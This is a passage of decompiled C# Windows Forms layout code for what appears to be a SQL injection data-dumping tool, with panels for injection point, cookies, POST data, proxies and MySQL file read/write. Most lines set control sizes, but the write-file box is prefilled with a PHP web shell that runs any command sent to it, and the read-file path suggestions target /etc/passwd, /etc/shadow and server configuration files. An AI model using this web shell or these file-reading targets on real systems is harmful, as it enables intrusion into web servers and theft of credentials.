		this.ToolStripSeparator1.Size = new global::System.Drawing.Size(6, 33);
		this.cmbMySQLWriteFilePath.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbMySQLWriteFilePath.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.cmbMySQLWriteFilePath.Name = "cmbMySQLWriteFilePath";
		this.cmbMySQLWriteFilePath.Size = new global::System.Drawing.Size(180, 33);
		this.ToolStripSeparator3.Name = "ToolStripSeparator3";
		this.ToolStripSeparator3.Size = new global::System.Drawing.Size(6, 33);
		this.btnMySQLWriteFile.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.btnMySQLWriteFile.Image = global::ns0.Class6.Run_16x_24;
		this.btnMySQLWriteFile.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnMySQLWriteFile.Name = "btnMySQLWriteFile";
		this.btnMySQLWriteFile.Size = new global::System.Drawing.Size(90, 30);
		this.btnMySQLWriteFile.Text = "Write..";
		this.txtMySQLWriteFile.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
		this.txtMySQLWriteFile.BackColor = global::System.Drawing.SystemColors.Window;
		this.txtMySQLWriteFile.Font = new global::System.Drawing.Font("Courier New", 9f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
		this.txtMySQLWriteFile.Location = new global::System.Drawing.Point(9, 29);
		this.txtMySQLWriteFile.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.txtMySQLWriteFile.MaxLength = 2048;
		this.txtMySQLWriteFile.Multiline = true;
		this.txtMySQLWriteFile.Name = "txtMySQLWriteFile";
		this.txtMySQLWriteFile.Size = new global::System.Drawing.Size(1363, 209);
		this.txtMySQLWriteFile.TabIndex = 121;
		this.txtMySQLWriteFile.TabStop = false;
		this.txtMySQLWriteFile.Text = "'<? system($_REQUEST['cmd']); ?>'";
		this.grbLoadFile.Controls.Add(this.tsMySQLReadFile);
		this.grbLoadFile.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.grbLoadFile.Location = new global::System.Drawing.Point(4, 5);
		this.grbLoadFile.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbLoadFile.Name = "grbLoadFile";
		this.grbLoadFile.Padding = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbLoadFile.Size = new global::System.Drawing.Size(1383, 77);
		this.grbLoadFile.TabIndex = 15;
		this.grbLoadFile.TabStop = false;
		this.grbLoadFile.Text = "Read File";
		this.tsMySQLReadFile.GripStyle = global::System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsMySQLReadFile.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.tsMySQLReadFile.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.lblReadPath,
			this.txtMySQLReadFilePath,
			this.ToolStripSeparator4,
			this.cmbMySQLReadFile,
			this.ToolStripSeparator6,
			this.btnMySQLReadFile
		});
		this.tsMySQLReadFile.Location = new global::System.Drawing.Point(4, 24);
		this.tsMySQLReadFile.Name = "tsMySQLReadFile";
		this.tsMySQLReadFile.Padding = new global::System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsMySQLReadFile.RenderMode = global::System.Windows.Forms.ToolStripRenderMode.System;
		this.tsMySQLReadFile.ShowItemToolTips = false;
		this.tsMySQLReadFile.Size = new global::System.Drawing.Size(1375, 33);
		this.tsMySQLReadFile.TabIndex = 12;
		this.tsMySQLReadFile.Text = "ToolStrip1";
		this.lblReadPath.AutoSize = false;
		this.lblReadPath.Name = "lblReadPath";
		this.lblReadPath.Size = new global::System.Drawing.Size(50, 19);
		this.lblReadPath.Text = "Path:";
		this.lblReadPath.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.txtMySQLReadFilePath.AutoCompleteCustomSource.AddRange(new string[]
		{
			"/home/www/HostName_com/html/index.php",
			"/etc/passwd",
			"/etc/shadow",
			"/etc/default/passwd",
			"/etc/passwd",
			"/etc/login.defs",
			"/etc/group",
			"/etc/apache2/apache2.conf",
			"c:\\\\boot.ini"
		});
		this.txtMySQLReadFilePath.AutoCompleteMode = global::System.Windows.Forms.AutoCompleteMode.Suggest;
		this.txtMySQLReadFilePath.AutoCompleteSource = global::System.Windows.Forms.AutoCompleteSource.CustomSource;
		this.txtMySQLReadFilePath.AutoSize = false;
		this.txtMySQLReadFilePath.Name = "txtMySQLReadFilePath";
		this.txtMySQLReadFilePath.Size = new global::System.Drawing.Size(298, 31);
		this.txtMySQLReadFilePath.Text = "/etc/passwd";
		this.ToolStripSeparator4.Name = "ToolStripSeparator4";
		this.ToolStripSeparator4.Size = new global::System.Drawing.Size(6, 33);
		this.cmbMySQLReadFile.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbMySQLReadFile.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.cmbMySQLReadFile.Name = "cmbMySQLReadFile";
		this.cmbMySQLReadFile.Size = new global::System.Drawing.Size(180, 33);
		this.ToolStripSeparator6.Name = "ToolStripSeparator6";
		this.ToolStripSeparator6.Size = new global::System.Drawing.Size(6, 33);
		this.btnMySQLReadFile.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.btnMySQLReadFile.Image = global::ns0.Class6.Run_16x_24;
		this.btnMySQLReadFile.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnMySQLReadFile.Name = "btnMySQLReadFile";
		this.btnMySQLReadFile.Size = new global::System.Drawing.Size(87, 30);
		this.btnMySQLReadFile.Text = "Read..";
		this.tpSearch.Controls.Add(this.txtSearchColumnResult);
		this.tpSearch.Controls.Add(this.tsSearchColumn);
		this.tpSearch.ImageIndex = 4;
		this.tpSearch.Location = new global::System.Drawing.Point(4, 29);
		this.tpSearch.Name = "tpSearch";
		this.tpSearch.Padding = new global::System.Windows.Forms.Padding(3);
		this.tpSearch.Size = new global::System.Drawing.Size(1391, 1253);
		this.tpSearch.TabIndex = 5;
		this.tpSearch.Text = "Search Column";
		this.tpSearch.UseVisualStyleBackColor = true;
		this.txtSearchColumnResult.BackColor = global::System.Drawing.SystemColors.Window;
		this.txtSearchColumnResult.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.txtSearchColumnResult.Font = new global::System.Drawing.Font("Courier New", 9f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
		this.txtSearchColumnResult.Location = new global::System.Drawing.Point(3, 36);
		this.txtSearchColumnResult.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.txtSearchColumnResult.MaxLength = 2048;
		this.txtSearchColumnResult.Multiline = true;
		this.txtSearchColumnResult.Name = "txtSearchColumnResult";
		this.txtSearchColumnResult.ReadOnly = true;
		this.txtSearchColumnResult.ScrollBars = global::System.Windows.Forms.ScrollBars.Both;
		this.txtSearchColumnResult.Size = new global::System.Drawing.Size(1385, 1214);
		this.txtSearchColumnResult.TabIndex = 121;
		this.txtSearchColumnResult.TabStop = false;
		this.txtSearchColumnResult.WordWrap = false;
		this.tsSearchColumn.GripStyle = global::System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsSearchColumn.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.tsSearchColumn.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.txtSearchColumn,
			this.ToolStripSeparator7,
			this.chkSearchColumnAllDBs,
			this.ToolStripSeparator8,
			this.btnSearchColumn
		});
		this.tsSearchColumn.Location = new global::System.Drawing.Point(3, 3);
		this.tsSearchColumn.Name = "tsSearchColumn";
		this.tsSearchColumn.Padding = new global::System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsSearchColumn.RenderMode = global::System.Windows.Forms.ToolStripRenderMode.System;
		this.tsSearchColumn.ShowItemToolTips = false;
		this.tsSearchColumn.Size = new global::System.Drawing.Size(1385, 33);
		this.tsSearchColumn.TabIndex = 12;
		this.tsSearchColumn.Text = "ToolStrip1";
		this.txtSearchColumn.AutoCompleteCustomSource.AddRange(new string[]
		{
			"/home/www/HostName_com/html/index.php",
			"/etc/passwd",
			"/etc/shadow",
			"/etc/default/passwd",
			"/etc/passwd",
			"/etc/login.defs",
			"/etc/group",
			"/etc/apache2/apache2.conf",
			"c:\\\\boot.ini"
		});
		this.txtSearchColumn.AutoCompleteMode = global::System.Windows.Forms.AutoCompleteMode.Suggest;
		this.txtSearchColumn.AutoCompleteSource = global::System.Windows.Forms.AutoCompleteSource.CustomSource;
		this.txtSearchColumn.AutoSize = false;
		this.txtSearchColumn.Name = "txtSearchColumn";
		this.txtSearchColumn.Size = new global::System.Drawing.Size(298, 33);
		this.txtSearchColumn.Text = "mail";
		this.ToolStripSeparator7.Name = "ToolStripSeparator7";
		this.ToolStripSeparator7.Size = new global::System.Drawing.Size(6, 33);
		this.chkSearchColumnAllDBs.CheckOnClick = true;
		this.chkSearchColumnAllDBs.Image = global::ns0.Class6.DatabaseSchema_16x_24;
		this.chkSearchColumnAllDBs.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.chkSearchColumnAllDBs.Name = "chkSearchColumnAllDBs";
		this.chkSearchColumnAllDBs.Size = new global::System.Drawing.Size(146, 30);
		this.chkSearchColumnAllDBs.Text = "All DataBases";
		this.ToolStripSeparator8.Name = "ToolStripSeparator8";
		this.ToolStripSeparator8.Size = new global::System.Drawing.Size(6, 33);
		this.btnSearchColumn.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.btnSearchColumn.Image = global::ns0.Class6.Run_16x_24;
		this.btnSearchColumn.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnSearchColumn.Name = "btnSearchColumn";
		this.btnSearchColumn.Size = new global::System.Drawing.Size(84, 30);
		this.btnSearchColumn.Text = "Start..";
		this.tpProxies.ImageIndex = 3;
		this.tpProxies.Location = new global::System.Drawing.Point(4, 29);
		this.tpProxies.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.tpProxies.Name = "tpProxies";
		this.tpProxies.Padding = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.tpProxies.Size = new global::System.Drawing.Size(1391, 1253);
		this.tpProxies.TabIndex = 3;
		this.tpProxies.Text = "A.\b\u0013";
		this.tpProxies.UseVisualStyleBackColor = true;
		this.imlTabs.ImageStream = (global::System.Windows.Forms.ImageListStreamer)componentResourceManager.GetObject("imlTabs.ImageStream");
		this.imlTabs.TransparentColor = global::System.Drawing.Color.Fuchsia;
		this.imlTabs.Images.SetKeyName(0, "ServerAudit_16x_24.bmp");
		this.imlTabs.Images.SetKeyName(1, "SQLScript_16x_24.bmp");
		this.imlTabs.Images.SetKeyName(2, "TextFile_16x_24.bmp");
		this.imlTabs.Images.SetKeyName(3, "PublishAllWebsite_16x_24.bmp");
		this.imlTabs.Images.SetKeyName(4, "SearchContract_16x_24.bmp");
		this.numSleepMultiThread.ForeColor = global::System.Drawing.SystemColors.ControlText;
		global::System.Windows.Forms.NumericUpDown numSleepMultiThread = this.numSleepMultiThread;
		int[] array = new int[4];
		array[0] = 50;
		numSleepMultiThread.Increment = new decimal(array);
		this.numSleepMultiThread.Location = new global::System.Drawing.Point(208, 102);
		global::System.Windows.Forms.NumericUpDown numSleepMultiThread2 = this.numSleepMultiThread;
		int[] array2 = new int[4];
		array2[0] = 20000;
		numSleepMultiThread2.Maximum = new decimal(array2);
		this.numSleepMultiThread.Name = "numSleepMultiThread";
		this.numSleepMultiThread.Size = new global::System.Drawing.Size(105, 26);
		this.numSleepMultiThread.TabIndex = 11;
		this.numSleepMultiThread.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Right;
		global::System.Windows.Forms.NumericUpDown numSleepMultiThread3 = this.numSleepMultiThread;
		int[] array3 = new int[4];
		array3[0] = 50;
		numSleepMultiThread3.Value = new decimal(array3);
		this.lblMultiThreadDelay.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.lblMultiThreadDelay.Location = new global::System.Drawing.Point(6, 105);
		this.lblMultiThreadDelay.Name = "lblMultiThreadDelay";
		this.lblMultiThreadDelay.Size = new global::System.Drawing.Size(195, 29);
		this.lblMultiThreadDelay.TabIndex = 4;
		this.lblMultiThreadDelay.Text = "Multi-Thread Delay  (ms)";
		this.lblMultiThreadDelay.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.lblMultiThreadRetry.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.lblMultiThreadRetry.Location = new global::System.Drawing.Point(6, 143);
		this.lblMultiThreadRetry.Name = "lblMultiThreadRetry";
		this.lblMultiThreadRetry.Size = new global::System.Drawing.Size(195, 29);
		this.lblMultiThreadRetry.TabIndex = 6;
		this.lblMultiThreadRetry.Text = "&Multi-Thread Retry Limit";
		this.lblMultiThreadRetry.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.numMaxRetryMultiThread.ForeColor = global::System.Drawing.SystemColors.ControlText;
		global::System.Windows.Forms.NumericUpDown numMaxRetryMultiThread = this.numMaxRetryMultiThread;
		int[] array4 = new int[4];
		array4[0] = 5;
		numMaxRetryMultiThread.Increment = new decimal(array4);
		this.numMaxRetryMultiThread.Location = new global::System.Drawing.Point(208, 137);
		global::System.Windows.Forms.NumericUpDown numMaxRetryMultiThread2 = this.numMaxRetryMultiThread;
		int[] array5 = new int[4];
		array5[0] = 1000;
		numMaxRetryMultiThread2.Maximum = new decimal(array5);
		global::System.Windows.Forms.NumericUpDown numMaxRetryMultiThread3 = this.numMaxRetryMultiThread;
		int[] array6 = new int[4];
		array6[0] = 1;
		numMaxRetryMultiThread3.Minimum = new decimal(array6);
		this.numMaxRetryMultiThread.Name = "numMaxRetryMultiThread";
		this.numMaxRetryMultiThread.Size = new global::System.Drawing.Size(105, 26);
		this.numMaxRetryMultiThread.TabIndex = 12;
		this.numMaxRetryMultiThread.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Right;
		global::System.Windows.Forms.NumericUpDown numMaxRetryMultiThread4 = this.numMaxRetryMultiThread;
		int[] array7 = new int[4];
		array7[0] = 100;
		numMaxRetryMultiThread4.Value = new decimal(array7);
		this.numSleep.ForeColor = global::System.Drawing.SystemColors.ControlText;
		global::System.Windows.Forms.NumericUpDown numSleep = this.numSleep;
		int[] array8 = new int[4];
		array8[0] = 50;
		numSleep.Increment = new decimal(array8);
		this.numSleep.Location = new global::System.Drawing.Point(208, 174);
		global::System.Windows.Forms.NumericUpDown numSleep2 = this.numSleep;
		int[] array9 = new int[4];
		array9[0] = 20000;
		numSleep2.Maximum = new decimal(array9);
		this.numSleep.Name = "numSleep";
		this.numSleep.Size = new global::System.Drawing.Size(105, 26);
		this.numSleep.TabIndex = 11;
		this.numSleep.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Right;
		global::System.Windows.Forms.NumericUpDown numSleep3 = this.numSleep;
		int[] array10 = new int[4];
		array10[0] = 200;
		numSleep3.Value = new decimal(array10);
		this.lblThreadDelay.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.lblThreadDelay.Location = new global::System.Drawing.Point(6, 177);
		this.lblThreadDelay.Name = "lblThreadDelay";
		this.lblThreadDelay.Size = new global::System.Drawing.Size(195, 29);
		this.lblThreadDelay.TabIndex = 4;
		this.lblThreadDelay.Text = "Single-Thread Delay  (ms)";
		this.lblThreadDelay.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.lblThreadRetry.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.lblThreadRetry.Location = new global::System.Drawing.Point(6, 212);
		this.lblThreadRetry.Name = "lblThreadRetry";
		this.lblThreadRetry.Size = new global::System.Drawing.Size(195, 29);
		this.lblThreadRetry.TabIndex = 6;
		this.lblThreadRetry.Text = "Single-Thread Retry Limit";
		this.lblThreadRetry.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.numMaxRetry.ForeColor = global::System.Drawing.SystemColors.ControlText;
		global::System.Windows.Forms.NumericUpDown numMaxRetry = this.numMaxRetry;
		int[] array11 = new int[4];
		array11[0] = 5;
		numMaxRetry.Increment = new decimal(array11);
		this.numMaxRetry.Location = new global::System.Drawing.Point(208, 209);
		global::System.Windows.Forms.NumericUpDown numMaxRetry2 = this.numMaxRetry;
		int[] array12 = new int[4];
		array12[0] = 1000;
		numMaxRetry2.Maximum = new decimal(array12);
		global::System.Windows.Forms.NumericUpDown numMaxRetry3 = this.numMaxRetry;
		int[] array13 = new int[4];
		array13[0] = 1;
		numMaxRetry3.Minimum = new decimal(array13);
		this.numMaxRetry.Name = "numMaxRetry";
		this.numMaxRetry.Size = new global::System.Drawing.Size(105, 26);
		this.numMaxRetry.TabIndex = 12;
		this.numMaxRetry.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Right;
		global::System.Windows.Forms.NumericUpDown numMaxRetry4 = this.numMaxRetry;
		int[] array14 = new int[4];
		array14[0] = 5;
		numMaxRetry4.Value = new decimal(array14);
		this.pnlSetupDump.Controls.Add(this.pnlSetupDump2);
		this.pnlSetupDump.Dock = global::System.Windows.Forms.DockStyle.Right;
		this.pnlSetupDump.Location = new global::System.Drawing.Point(1399, 0);
		this.pnlSetupDump.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.pnlSetupDump.Name = "pnlSetupDump";
		this.pnlSetupDump.Size = new global::System.Drawing.Size(363, 1286);
		this.pnlSetupDump.TabIndex = 31;
		this.pnlSetupDump2.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
		this.pnlSetupDump2.AutoScroll = true;
		this.pnlSetupDump2.Controls.Add(this.tsNewDumpBtn);
		this.pnlSetupDump2.Controls.Add(this.grbInjectionPoint);
		this.pnlSetupDump2.Controls.Add(this.grbLogin);
		this.pnlSetupDump2.Controls.Add(this.grbDumpSetup2);
		this.pnlSetupDump2.Controls.Add(this.grbMySQLSplitRows);
		this.pnlSetupDump2.Controls.Add(this.grbDumpSetup);
		this.pnlSetupDump2.Controls.Add(this.grbOracleCollactions);
		this.pnlSetupDump2.Controls.Add(this.grbMSSQLCollactions);
		this.pnlSetupDump2.Controls.Add(this.grbMySQLCollactions);
		this.pnlSetupDump2.Controls.Add(this.grbSetupCon);
		this.pnlSetupDump2.Location = new global::System.Drawing.Point(9, 22);
		this.pnlSetupDump2.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.pnlSetupDump2.Name = "pnlSetupDump2";
		this.pnlSetupDump2.Size = new global::System.Drawing.Size(345, 1251);
		this.pnlSetupDump2.TabIndex = 45;
		this.tsNewDumpBtn.GripStyle = global::System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsNewDumpBtn.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.tsNewDumpBtn.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.btnLoadDefautSettings,
			this.btnLoadNewDumper
		});
		this.tsNewDumpBtn.Location = new global::System.Drawing.Point(0, 1611);
		this.tsNewDumpBtn.Name = "tsNewDumpBtn";
		this.tsNewDumpBtn.Padding = new global::System.Windows.Forms.Padding(0, 0, 4, 0);
		this.tsNewDumpBtn.RenderMode = global::System.Windows.Forms.ToolStripRenderMode.System;
		this.tsNewDumpBtn.ShowItemToolTips = false;
		this.tsNewDumpBtn.Size = new global::System.Drawing.Size(319, 32);
		this.tsNewDumpBtn.Stretch = true;
		this.tsNewDumpBtn.TabIndex = 48;
		this.tsNewDumpBtn.Text = "ToolStrip2";
		this.btnLoadDefautSettings.Image = global::ns0.Class6.delete;
		this.btnLoadDefautSettings.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnLoadDefautSettings.Name = "btnLoadDefautSettings";
		this.btnLoadDefautSettings.Size = new global::System.Drawing.Size(126, 29);
		this.btnLoadDefautSettings.Text = "&Clear Form";
		this.btnLoadNewDumper.Alignment = global::System.Windows.Forms.ToolStripItemAlignment.Right;
		this.btnLoadNewDumper.Image = global::ns0.Class6.ConfirmButton_16x_24;
		this.btnLoadNewDumper.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnLoadNewDumper.Name = "btnLoadNewDumper";
		this.btnLoadNewDumper.Size = new global::System.Drawing.Size(145, 29);
		this.btnLoadNewDumper.Text = "&New Dumper";
		this.grbInjectionPoint.Controls.Add(this.lblHeaderValue);
		this.grbInjectionPoint.Controls.Add(this.txtAddHeaderValue);
		this.grbInjectionPoint.Controls.Add(this.lblHeaderName);
		this.grbInjectionPoint.Controls.Add(this.txtAddHeaderName);
		this.grbInjectionPoint.Controls.Add(this.lblInjectionPointMethod);
		this.grbInjectionPoint.Controls.Add(this.lblInjectionPoint);
		this.grbInjectionPoint.Controls.Add(this.cmbInjectionPoint);
		this.grbInjectionPoint.Controls.Add(this.cmbMethod);
		this.grbInjectionPoint.Controls.Add(this.txtCookies);
		this.grbInjectionPoint.Controls.Add(this.txtPost);
		this.grbInjectionPoint.Controls.Add(this.lblPost);
		this.grbInjectionPoint.Controls.Add(this.lblCookies);
		this.grbInjectionPoint.Controls.Add(this.chkAddHearder);
		this.grbInjectionPoint.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.grbInjectionPoint.Location = new global::System.Drawing.Point(0, 1249);
		this.grbInjectionPoint.Name = "grbInjectionPoint";
		this.grbInjectionPoint.Size = new global::System.Drawing.Size(319, 362);
		this.grbInjectionPoint.TabIndex = 46;
		this.grbInjectionPoint.TabStop = false;
		this.grbInjectionPoint.Text = "&Injection Point:";
		this.lblHeaderValue.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.lblHeaderValue.Location = new global::System.Drawing.Point(15, 306);
		this.lblHeaderValue.Name = "lblHeaderValue";
		this.lblHeaderValue.Size = new global::System.Drawing.Size(80, 29);
		this.lblHeaderValue.TabIndex = 26;
		this.lblHeaderValue.Text = "&Value:";
		this.lblHeaderValue.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.txtAddHeaderValue.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
		this.txtAddHeaderValue.Enabled = false;
		this.txtAddHeaderValue.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.txtAddHeaderValue.Location = new global::System.Drawing.Point(100, 308);
		this.txtAddHeaderValue.Name = "txtAddHeaderValue";
		this.txtAddHeaderValue.Size = new global::System.Drawing.Size(211, 26);
		this.txtAddHeaderValue.TabIndex = 25;
		this.lblHeaderName.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.lblHeaderName.Location = new global::System.Drawing.Point(15, 277);
		this.lblHeaderName.Name = "lblHeaderName";
		this.lblHeaderName.Size = new global::System.Drawing.Size(80, 29);
		this.lblHeaderName.TabIndex = 24;
		this.lblHeaderName.Text = "&Name:";
		this.lblHeaderName.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.txtAddHeaderName.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
		this.txtAddHeaderName.Enabled = false;
		this.txtAddHeaderName.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.txtAddHeaderName.Location = new global::System.Drawing.Point(100, 272);
		this.txtAddHeaderName.Name = "txtAddHeaderName";
		this.txtAddHeaderName.Size = new global::System.Drawing.Size(211, 26);
		this.txtAddHeaderName.TabIndex = 23;
		this.lblInjectionPointMethod.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.lblInjectionPointMethod.Location = new global::System.Drawing.Point(14, 65);
		this.lblInjectionPointMethod.Name = "lblInjectionPointMethod";
		this.lblInjectionPointMethod.Size = new global::System.Drawing.Size(84, 29);
		this.lblInjectionPointMethod.TabIndex = 16;
		this.lblInjectionPointMethod.Text = "&Method";
		this.lblInjectionPointMethod.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.lblInjectionPoint.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.lblInjectionPoint.Location = new global::System.Drawing.Point(14, 29);
		this.lblInjectionPoint.Name = "lblInjectionPoint";
		this.lblInjectionPoint.Size = new global::System.Drawing.Size(84, 29);
		this.lblInjectionPoint.TabIndex = 15;
		this.lblInjectionPoint.Text = "&Injection Point:";
		this.lblInjectionPoint.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.cmbInjectionPoint.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
		this.cmbInjectionPoint.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbInjectionPoint.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.cmbInjectionPoint.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.cmbInjectionPoint.FormattingEnabled = true;
		this.cmbInjectionPoint.Location = new global::System.Drawing.Point(100, 26);
		this.cmbInjectionPoint.Name = "cmbInjectionPoint";
		this.cmbInjectionPoint.Size = new global::System.Drawing.Size(211, 28);
		this.cmbInjectionPoint.TabIndex = 14;
		this.cmbMethod.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
		this.cmbMethod.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbMethod.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.cmbMethod.FormattingEnabled = true;
		this.cmbMethod.Location = new global::System.Drawing.Point(100, 65);
		this.cmbMethod.Name = "cmbMethod";
		this.cmbMethod.Size = new global::System.Drawing.Size(211, 28);
		this.cmbMethod.TabIndex = 3;
		this.txtCookies.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
		this.txtCookies.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.txtCookies.Location = new global::System.Drawing.Point(14, 132);
		this.txtCookies.Name = "txtCookies";
		this.txtCookies.Size = new global::System.Drawing.Size(297, 26);
		this.txtCookies.TabIndex = 3;
		this.txtPost.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
		this.txtPost.Enabled = false;
		this.txtPost.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.txtPost.Location = new global::System.Drawing.Point(14, 202);
		this.txtPost.Name = "txtPost";
		this.txtPost.Size = new global::System.Drawing.Size(297, 26);
		this.txtPost.TabIndex = 4;
		this.lblPost.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.lblPost.Location = new global::System.Drawing.Point(14, 172);
		this.lblPost.Name = "lblPost";
		this.lblPost.Size = new global::System.Drawing.Size(146, 29);
		this.lblPost.TabIndex = 21;
		this.lblPost.Text = "&POST";
		this.lblPost.TextAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
		this.lblCookies.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.lblCookies.Location = new global::System.Drawing.Point(14, 103);
		this.lblCookies.Name = "lblCookies";
		this.lblCookies.Size = new global::System.Drawing.Size(146, 29);
		this.lblCookies.TabIndex = 19;
		this.lblCookies.Text = "Coo&kies";
		this.lblCookies.TextAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
		this.chkAddHearder.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
		this.chkAddHearder.CheckAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkAddHearder.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.chkAddHearder.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.chkAddHearder.Location = new global::System.Drawing.Point(100, 248);
		this.chkAddHearder.Name = "chkAddHearder";
		this.chkAddHearder.Size = new global::System.Drawing.Size(213, 25);
		this.chkAddHearder.TabIndex = 27;
		this.chkAddHearder.Text = "&Add Header";
		this.chkAddHearder.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkAddHearder.UseVisualStyleBackColor = true;
		this.grbLogin.Controls.Add(this.txtUserName);
		this.grbLogin.Controls.Add(this.txtPassword);
		this.grbLogin.Controls.Add(this.lblLoginUser);
		this.grbLogin.Controls.Add(this.lblLoginPassword);
		this.grbLogin.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.grbLogin.Location = new global::System.Drawing.Point(0, 1149);
		this.grbLogin.Name = "grbLogin";
		this.grbLogin.Size = new global::System.Drawing.Size(319, 100);
		this.grbLogin.TabIndex = 45;
		this.grbLogin.TabStop = false;
		this.grbLogin.Text = "Network Credential (&Login)";
		this.txtUserName.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
		this.txtUserName.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.txtUserName.Location = new global::System.Drawing.Point(100, 25);
		this.txtUserName.Name = "txtUserName";
		this.txtUserName.Size = new global::System.Drawing.Size(211, 26);
		this.txtUserName.TabIndex = 16;
		this.txtPassword.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
		this.txtPassword.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.txtPassword.Location = new global::System.Drawing.Point(100, 60);
		this.txtPassword.Name = "txtPassword";
